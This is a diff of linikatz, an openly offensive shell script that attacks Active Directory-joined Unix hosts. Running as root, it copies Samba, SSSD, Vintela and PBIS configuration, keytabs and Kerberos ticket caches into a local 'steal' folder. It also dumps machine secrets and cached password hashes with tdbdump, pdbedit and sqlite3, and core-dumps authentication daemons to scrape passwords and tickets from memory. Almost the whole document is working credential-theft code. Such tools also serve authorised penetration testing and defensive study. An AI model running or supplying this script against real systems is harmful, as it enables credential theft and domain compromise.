@@ -23,113 +23,455 @@
 # (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 # SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 
-r="${RANDOM}"
+header () {
+	printf " _ _       _ _         _\n"
+	printf "| (_)_ __ (_) | ____ _| |_ ____\n"
+	printf "| | | '_ \| | |/ / _\` | __|_  /\n"
+	printf "| | | | | | |   < (_| | |_ / /\n"
+	printf "|_|_|_| |_|_|_|\_\__,_|\__/___|\n"
+	printf "\n"
+	printf "             =[ @timb_machine ]=\n"
+	printf "\n"
+}
 
-printf " _ _       _ _         _\n"
-printf "| (_)_ __ (_) | ____ _| |_ ____\n"
-printf "| | | '_ \| | |/ / _\` | __|_  /\n"
-printf "| | | | | | |   < (_| | |_ / /\n"
-printf "|_|_|_| |_|_|_|\_\__,_|\__/___|\n"
-printf "\n"
-printf "             =[ @timb_machine ]=\n"
-echo
-if [ "$(id -u)" != "0" ]
-then
-	printf "E: Not running as root\n"
-	exit
-fi
-printf "I: AD configuration\n"
-for filename in /var/lib/samba /var/cache/samba /etc/samba /var/lib/sss /etc/sssd /var/opt/quest /etc/opt/quest
-do
-        if [ -d "${filename}" ]
+version () {
+	header
+	preamble
+	printf "Brought to you by:\n"
+	printf "\n"
+	cat doc/AUTHORS
+	exit 1
+}
+
+preamble () {
+	printf "Shell script to attack AD on UNIX\n"
+}
+
+usage () {
+	header
+	preamble
+	printf "Usage: %s\n" "${0}"
+	exit 1
+}
+
+stdio_message_log () {
+	check="${1}"
+	message="${2}"
+	[ "$(validate_is_string "${check}")" ] || false
+	[ "$(validate_is_string "${message}")" ] || false
+	if [ "${VERBOSE}" -ge 1 ]
 	then
-		find "${filename}" -ls >>"linikatz.$$.${r}"
-		cp -rp "${filename}" "$(printf "%s" "${filename}" | tr "/" "_").$$.${r}"
+		stdio_format_message "32" "I" "${check}" "${message}"
 	fi
-done
-for filename in /etc/krb5.conf /tmp/krb5*
-do
+}
+
+stdio_message_warn () {
+	check="${1}"
+	message="${2}"
+	[ "$(validate_is_string "${check}")" ] || false
+	[ "$(validate_is_string "${message}")" ] || false
+	stdio_format_message "33" "W" "${check}" "${message}"
+}
+
+stdio_message_debug () {
+	check="${1}"
+	message="${2}"
+	[ "$(validate_is_string "${check}")" ] || false
+	[ "$(validate_is_string "${message}")" ] || false
+	if [ "${VERBOSE}" -ge 2 ]
+	then
+		stdio_format_message "35" "D" "${check}" "${message}" >&2
+	fi
+}
+
+stdio_message_error () {
+	check="${1}"
+	message="${2}"
+	[ "$(validate_is_string "${check}")" ] || false
+	[ "$(validate_is_string "${message}")" ] || false
+	stdio_format_message "31" "E" "${check}" "${message}" >&2
+}
+
+stdio_format_message () {
+	color="${1}"
+	type="${2}"
+	check="${3}"
+	message="${4}"
+	[ "$(validate_is_string "${type}")" ] || false
+	[ "$(validate_is_string "${check}")" ] || false
+	[ "$(validate_is_string "${message}")" ] || false
+	[ "$(validate_is_number "${color}")" ] || false
+	if [ "${COLORING}" -eq 1 ]
+	then
+		printf "\033[%sm%s: [%s] %s\033[m\n" "${color}" "${type}" "${check}" "${message}"
+	else
+		printf "%s: [%s] %s\n" "${type}" "${check}" "${message}"
+	fi
+}
+
+validate_matches_regex () {
+	value="${1}"
+	regex="${2}"
+	if [ -n "$(printf -- "%s" "${value}" | egrep -- "$regex")" ]
+	then
+		printf -- "1\n"
+	else
+		printf -- "0\n"
+	fi
+}
+
+validate_is_string () {
+	value="${1}"
+	if [ "$(validate_matches_regex "${value}" ".*")" -eq 1 ]
+	then
+		printf -- "1\n"
+	else
+		stdio_message_error "validate" "invalid string: ${value}"
+		printf -- "0\n"
+	fi
+}
+
+validate_is_number () {
+	value="${1}"
+	if [ "$(validate_matches_regex "${value}" "^[0-9]+$")" -eq 1 ]
+	then
+		printf -- "1\n"
+	else
+		stdio_message_error "validate" "invalid number: ${value}"
+		printf -- "0\n"
+	fi
+}
+
+validate_is_boolean () {
+	value="${1}"
+	if [ "$(validate_is_regex "${value}" "^[0-1]$")" -eq 1 ]
+	then
+		printf -- "1\n"
+	else
+		stdio_message_error "validate" "invalid boolean: ${value}"
+		printf -- "0\n"
+	fi
+}
+
+needs_root () {
+	if [ "$(id -u)" == "0" ]
+	then
+		printf -- "1\n"
+	else
+		printf -- "0\n"
+	fi
+}
+
+file_list () {
+	filename="${1}"
+	[ "$(validate_is_string "${filename}")" ] || false
+	if [ "$(file_exists "${filename}")" -eq 1 ]
+	then
+		find "${filename}" -type f
+	fi
+}
+
+file_exists () {
+	filename="${1}"
+	[ "$(validate_is_string "${filename}")" ] || false
+	if [ -e "${filename}" ]
+	then
+		printf -- "1\n"
+	else
+		printf -- "0\n"
+	fi
+}
+
+file_is_regular () {
+	filename="${1}"
+	[ "$(validate_is_string "${filename}")" ] || false
 	if [ -f "${filename}" ]
 	then
-		ls -l "${filename}" >>"linikatz.$$.${r}"
-		cp -p "${filename}" "$(printf "%s" "${filename}" | tr "/" "_").$$.${r}"
+		printf -- "1\n"
+	else
+		printf -- "0\n"
 	fi
-done
-printf "I: Machine secrets\n"
-if [ -f /var/lib/samba/private/secrets.tdb ]
-then
-	tdbdump /var/lib/samba/private/secrets.tdb | grep -A 1 _PASSWORD >>"linikatz.$$.${r}"
-fi
-printf "I: On disk cached credentials, stored as hashes\n"
-if [ -f /var/lib/samba/passdb.tdb ]
-then
-	pdbedit -s /etc/samba/smb.conf -L -w >>"linikatz.$$.${r}"
-fi
-if [ -d /var/lib/sss ]
-then
-	for filename in /var/lib/sss/db/cache_*
-	do
-		if [ -f "${filename}" ]
+}
+
+file_is_executable () {
+	filename="${1}"
+	[ "$(validate_is_string "${filename}")" ] || false
+	if [ -x "${filename}" ]
+	then
+		printf -- "1\n"
+	else
+		printf -- "0\n"
+	fi
+}
+
+file_is_directory () {
+	filename="${1}"
+	[ "$(validate_is_string "${filename}")" ] || false
+	if [ -d "${filename}" ]
+	then
+		printf -- "1\n"
+	else
+		printf -- "0\n"
+	fi
+}
+
+file_steal () {
+	filename="${1}"
+	[ "$(validate_is_string "${filename}")" ] || false
+	if [ "$(file_exists "${filename}")" -eq 1 ]
+	then
+		ls -l "${filename}"
+		directoryname="linikatz.$$"
+		if [ "$(file_is_directory "${directoryname}")" -ne 1 ]
 		then
-       			tdbdump "${filename}" | grep -A 1 DN=NAME | grep "\\\$6\\\$" | sed -e "s/.*cachedPassword.*\\\$6\\\$/\\\$6\\\$/g" -e "s/\\\00lastCached.*//g" >> "linikatz.$$.${r}"
+			mkdir "${directoryname}"
 		fi
-	done
-fi
-if [ -f /var/opt/quest/vas/authcache/vas_auth.vdb ]
-then
-	sqlite3 /var/opt/quest/vas/authcache/vas_auth.vdb "SELECT krb5pname, sha1hash, legacyHash FROM authcache" >>"linikatz.$$.${r}"
-fi
-printf "I: Machine kerberos tickets\n"
-if [ -d /var/lib/sss ]
-then
-	for filename in /var/lib/sss/db/ccache_*
+		stolenfilename="${directoryname}/$(printf "%s" "${filename}" | tr "/" "_").${RANDOM}"
+		cp "${filename}" "${stolenfilename}"
+	fi
+}
+
+process_list () {
+	pattern="${1}"
+	[ "`validate_is_string \"${pattern}\"`" ] || false
+	ps -aeo ruser,rgroup,pid,ppid,args | grep -v "PID" | grep "${pattern}" | grep -v "grep" | while read userid groupid processid parentid command arguments
 	do
-		if [ -f "${filename}" ]
+		printf -- "${processid}\n"
+	done
+}
+
+process_dump () {
+	processid="${1}"
+	directoryname="linikatz.$$"
+	if [ "$(file_is_directory "${directoryname}")" -ne 1 ]
+	then
+		mkdir "${directoryname}"
+	fi
+	dumpedfilename="${directoryname}/process.${RANDOM}"
+	gcore -o "${dumpedfilename}" "${processid}" >/dev/null 2>&1
+	printf -- "%s\n" "${dumpedfilename}.${processid}"
+}
+
+process_maps_by_library () {
+	egrep -- "${pattern}" /proc/[0-9]*/maps 2>/dev/null | cut -f 3 -d "/" | sort | uniq
+}
+
+config_steal () {
+	for filename in "$@"
+	do
+		[ "$(validate_is_string "${filename}")" ] || false
+		if [ "$(file_is_directory "${filename}")" -eq 1 ]
 		then
-			if [ -x /usr/bin/klist ]
+			file_list "${filename}" | while read filename
+			do
+				file_steal "${filename}"
+			done
+		else
+			if [ "$(file_is_regular "${filename}")" -eq 1 ]
 			then
-				/usr/bin/klist "${filename}" >>"linikatz.$$.${r}"
+				file_steal "${filename}"
 			fi
 		fi
 	done
-fi
-if [ -f /etc/opt/quest/vas/host.keytab ]
+}
+
+COLORING="0"
+VERBOSE="1"
+while [ -n "${1}" ]
+do
+	case "${1}" in
+		--help|-h)
+			usage
+			;;
+		--version|-v|-V)
+			version
+			;;
+		--color|-c|--colour)
+			COLORING="1"
+			;;
+		--verbose)
+			shift
+			VERBOSE="${1}"
+			;;
+		
+	esac
+	shift
+done
+header
+stdio_message_log "vintella-check" "Vintela AD configuration"
+[ "$(needs_root)" -eq 1 ] && config_steal /var/opt/quest /etc/opt/quest || stdio_message_warn "needs" "not running as root"
+stdio_message_log "sss-check" "SSS AD configuration"
+[ "$(needs_root)" -eq 1 ] && config_steal /var/lib/sss /etc/sssd || stdio_message_warn "needs" "not running as root"
+stdio_message_log "pbiss-check" "PBIS AD configuration"
+[ "$(needs_root)" -eq 1 ] && config_steal /var/lib/pbis /etc/pbis || stdio_message_warn "needs" "not running as root"
+stdio_message_log "samba-check" "Samba configuration"
+[ "$(needs_root)" -eq 1 ] && config_steal /var/lib/samba /var/cache/samba /etc/samba || stdio_message_warn "needs" "not running as root"
+stdio_message_log "kerberos-check" "Kerberos configuration"
+[ "$(needs_root)" -eq 1 ] && config_steal /etc/krb5.conf /etc/krb5.keytab /tmp/krb5* || stdio_message_warn "needs" "not running as root"
+stdio_message_log "samba-check" "Samba machine secrets"
+if [ "$(needs_root)" -eq 1 ]
 then
-	if [ -x /opt/quest/bin/ktutil ]
-	then
-		/opt/quest/bin/ktutil --keytab=/etc/opt/quest/vas/host.keytab list >>"linikatz.$$.${r}"
-	fi
+	file_list /var/lib/samba/private | while read filename
+	do
+		if [ "$(file_is_regular "${filename}")" -eq 1 ]
+		then
+			tdbdump "${filename}" | grep -A 1 _PASSWORD
+		fi
+	done
+else
+	stdio_message_warn "needs" "not running as root"
 fi
-printf "I: User kerberos tickets\n"
+stdio_message_log "samba-check" "Samba hashes"
+if [ "$(needs_root)" -eq 1 ]
+then
+	if [ "$(file_is_regular /var/lib/samba/passdb.tdb)" -eq 1 ]
+	then
+		pdbedit -s /etc/samba/smb.conf -L -w
+	fi
+else
+	stdio_message_warn "needs" "not running as root"
+fi
+stdio_message_log "check" "Cached hashes"
+if [ "$(needs_root)" -eq 1 ]
+then
+	if [ "$(file_is_directory /var/lib/sss)" -eq 1 ]
+	then
+		stdio_message_log "sss-check" "SSS hashes"
+		for filename in /var/lib/sss/db/cache_*
+		do
+			if [ "$(file_is_regular "${filename}")" -eq 1 ]
+			then
+				tdbdump "${filename}" | grep -A 1 DN=NAME | grep "\\\$6\\\$" | sed -e "s/.*cachedPassword.*\\\$6\\\$/\\\$6\\\$/g" -e "s/\\\00lastCached.*//g" 
+			fi
+		done
+	fi
+	if [ "$(file_is_directory /var/opt/quest)" -eq 1 ]
+	then
+		stdio_message_log "vintela-check" "Vintela hashes"
+		sqlite3 /var/opt/quest/vas/authcache/vas_auth.vdb "SELECT krb5pname, sha1hash, legacyHash FROM authcache"
+	fi
+else
+	stdio_message_warn "needs" "not running as root"
+fi
+stdio_message_log "needs" "Machine Kerberos tickets"
+if [ "$(needs_root)" -eq 1 ]
+then
+	if [ "$(file_is_directory /var/lib/sss)" -eq 1 ]
+	then
+		stdio_message_log "sss-check" "SSS ticket list"
+		for filename in /var/lib/sss/db/ccache_*
+		do
+			if [ "$(file_is_regular "${filename}")" -eq 1 ]
+			then
+				/usr/bin/klist -c "${filename}" -e -d -f
+			fi
+		done
+	fi
+	if [ "$(file_is_directory /var/opt/quest)" -eq 1 ]
+	then
+		stdio_message_log "vintela-check" "Vintela ticket list"
+		if [ "$(file_is_regular /etc/opt/quest/vas/host.keytab)" -eq 1 ]
+		then
+			/opt/quest/bin/ktutil --keytab=/etc/opt/quest/vas/host.keytab
+		fi
+	fi
+	if [ "$(file_is_directory /var/lib/pbis)" -eq 1 ]
+	then
+		stdio_message_log "pbis-check" "PBIS ticket list"
+		if [ "$(file_is_regular /etc/krb5.keytab)" -eq 1 ]
+		then
+			printf "read_kt /etc/krb5.keytab\nlist\nquit\n" | /opt/pbis/bin/ktutil
+		fi
+		for filename in /var/lib/pbis/krb5cc_lsass*
+		do
+			if [ "$(file_is_regular "${filename}")" -eq 1 ]
+			then
+				/opt/pbis/bin/klist -c "${filename}" -e -d -f
+			fi
+		done
+	fi
+else
+	stdio_message_warn "needs" "not running as root"
+fi
+stdio_message_log "kerberos-check" "User Kerberos tickets"
 for filename in /tmp/krb5*
 do
-	if [ -f "${filename}" ]
+	if [ "$(file_is_regular "${filename}")" -eq 1 ]
 	then
-		if [ -x /usr/bin/klist ]
+		if [ "$(file_is_regular /usr/bin/klist)" -eq 1 ]
 		then
-			/usr/bin/klist -c "${filename}" -e -d -f >>"linikatz.$$.${r}"
+			/usr/bin/klist -c "${filename}" -e -d -f
 		else
-			if [ -x /opt/quest/bin/klist ]
+			if [ "$(file_is_regular /opt/quest/bin/klist)" -eq 1 ]
 			then
-				/opt/quest/bin/klist -c "${filename}" -v --hidden >>"linikatz.$$.${r}"
+				/opt/quest/bin/klist -c "${filename}" -v --hidden
+			else
+				if [ "$(file_is_regular /opt/pbis/bin/klist)" -eq 1 ]
+				then
+					/opt/pbis/bin/klist -c "${filename}" -e -d -f
+				fi
 			fi
 		fi
 	fi
 done
-printf "I: In memory passwords, plain text or stored as a hash\n"
-pgrep sss | while read processid
+stdio_message_log "memory-check" "In memory passwords, plain text or stored as a hash"
+if [ "$(needs_root)" -eq 1 ]
+then
+	stdio_message_log "sss-check" "SSS processes"
+	process_list "sss" | while read processid
+	do
+		stdio_message_log "sss-check" "Process dump (${processid})"
+		process_dump "${processid}" | while read filename
+		do
+			[ "$(file_is_regular "${filename}")" -eq 1 ] && strings "${filename}" | egrep "MAPI|\\\$6\\\$" | sort | uniq
+		done
+	done
+else
+	stdio_message_warn "needs" "not running as root"
+fi
+if [ "$(needs_root)" -eq 1 ]
+then
+	stdio_message_log "vintela-check" "Vintela processes"
+	process_list "vasd" | while read processid
+	do
+		stdio_message_log "check" "Vintela process dump (${processid})"
+		process_dump "${processid}" | while read filename
+		do
+			[ "$(file_is_regular "${filename}")" -eq 1 ] && strings "${filename}" | sort | uniq
+		done
+	done
+else
+	stdio_message_warn "needs" "not running as root"
+fi
+if [ "$(needs_root)" -eq 1 ]
+then
+	stdio_message_log "pbis-check" "PBIS processes"
+	process_list "lwsmd|lw-" | while read processid
+	do
+		stdio_message_log "check" "PBIS process dump (${processid})"
+		process_dump "${processid}" | while read filename
+		do
+			[ "$(file_is_regular "${filename}")" -eq 1 ] && strings "${filename}" | sort | uniq
+		done
+	done
+else
+	stdio_message_warn "needs" "not running as root"
+fi
+stdio_message_log "memory-check" "In memory tickets"
+process_maps_by_library libkrb5 | while read processid
 do
-        gcore -o "sss.$$.${r}" "${processid}" 2>/dev/null >>strings."linikatz.$$.${r}"
-        strings "sss.$$.${r}.${processid}" | egrep "MAPI|\\\$6\\\$" | sort | uniq >>strings."linikatz.$$.${r}"
+	stdio_message_log "kerberos-check" "Kerberos process dump (${processid})"
+	process_dump "${processid}" | while read filename
+	do
+		[ "$(file_is_regular "${filename}")" -eq 1 ] && strings "${filename}" | sort | uniq
+	done
 done
-pgrep vasd | while read processid
+stdio_message_log "memory-check" "In memory trusts"
+process_maps_by_library libldap | while read processid
 do
-        gcore -o "vas.$$.${r}" "${processid}" 2>/dev/null >>strings."linikatz.$$.${r}"
-        strings "vas.$$.${r}.${processid}" | sort | uniq >>strings."linikatz.$$.${r}"
-done
-printf "I: In memory tickets\n"
-grep libkrb5.so /proc/[0-9]*/maps 2>/dev/null | cut -f 3 -d "/" | while read processid
-do
-        gcore -o "krb5.$$.${r}" "${processid}" 2>/dev/null >>"strings.linikatz.$$.${r}"
-        strings "krb5.$$.${r}.${processid}" | sort | uniq >>"strings.linikatz.$$.${r}"
+	stdio_message_log "ldap-check" "LDAP process dump (${processid})"
+	process_dump "${processid}" | while read filename
+	do
+		[ "$(file_is_regular "${filename}")" -eq 1 ] && strings "${filename}" | sort | uniq
+	done
 done
